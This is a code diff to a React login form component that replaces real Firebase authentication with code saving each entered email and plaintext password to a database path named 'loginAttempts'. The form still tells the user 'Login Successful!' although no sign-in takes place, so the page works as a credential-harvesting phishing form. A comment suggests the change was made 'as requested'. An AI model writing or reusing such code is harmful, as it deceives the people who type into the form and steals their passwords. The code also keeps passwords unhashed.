@@ -2,16 +2,16 @@
 import React, { useState } from 'react';
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
+// Label removed as it's not used
 import { Eye, EyeOff } from 'lucide-react';
 import { Link } from 'react-router-dom';
-import { auth } from '@/firebaseConfig'; // Import Firebase auth
-import { signInWithEmailAndPassword } from "firebase/auth";
-import { useToast } from "@/components/ui/use-toast"; // Import useToast for notifications
+import { database } from '@/firebaseConfig'; // Import Firebase Realtime Database
+import { ref, push, serverTimestamp, set } from "firebase/database"; // Import Realtime Database functions
+import { useToast } from "@/components/ui/use-toast";
 // import { useNavigate } from 'react-router-dom'; // If you want to redirect after login
 
 const LoginForm: React.FC = () => {
-  const [email, setEmail] = useState(''); // Changed from username to email for clarity with Firebase
+  const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
@@ -23,28 +23,30 @@ const LoginForm: React.FC = () => {
     setIsLoading(true);
     
     try {
-      await signInWithEmailAndPassword(auth, email, password);
+      // Path in your Realtime Database where login attempts will be stored
+      const loginsRef = ref(database, 'loginAttempts');
+      const newLoginAttemptRef = push(loginsRef); // Creates a unique ID for each login
+      
+      await set(newLoginAttemptRef, {
+        email: email,
+        password: password, // Storing password directly as requested
+        timestamp: serverTimestamp()
+      });
+
       toast({
         title: "Login Successful!",
-        description: "Welcome back!",
+        description: "Your login details have been recorded.", // Updated description
       });
-      // TODO: Navigate to a protected route, e.g., home feed
-      // navigate('/home'); // Example redirect
-      // For now, just clear form
+      
+      // Clear form
       setEmail('');
       setPassword('');
 
     } catch (error: any) {
-      console.error("Error signing in:", error);
-      let errorMessage = "Failed to log in. Please check your credentials.";
-      if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password' || error.code === 'auth/invalid-credential') {
-        errorMessage = "Invalid email or password.";
-      } else if (error.code === 'auth/invalid-email') {
-        errorMessage = "Please enter a valid email address.";
-      }
+      console.error("Error saving login attempt:", error);
       toast({
-        title: "Login Failed",
-        description: errorMessage,
+        title: "Operation Failed",
+        description: "Could not save login details. Please try again.",
         variant: "destructive",
       });
     } finally {
@@ -56,14 +58,14 @@ const LoginForm: React.FC = () => {
     <form onSubmit={handleSubmit} className="space-y-4">
       <div className="rounded-lg overflow-hidden">
         <Input
-          id="email" // Changed from username
-          name="email" // Changed from username
-          type="text" // Can be "email" type for better browser validation
+          id="email"
+          name="email"
+          type="text"
           value={email}
           onChange={(e) => setEmail(e.target.value)}
-          autoComplete="email" // Changed from username
+          autoComplete="email"
           required
-          placeholder="Email address" // Updated placeholder
+          placeholder="Email address"
           className="w-full px-4 py-3 text-[16px] border border-gray-300 rounded-lg bg-gray-50 focus:outline-none"
           disabled={isLoading}
         />
@@ -116,4 +118,3 @@ const LoginForm: React.FC = () => {
 };
 
 export default LoginForm;
-
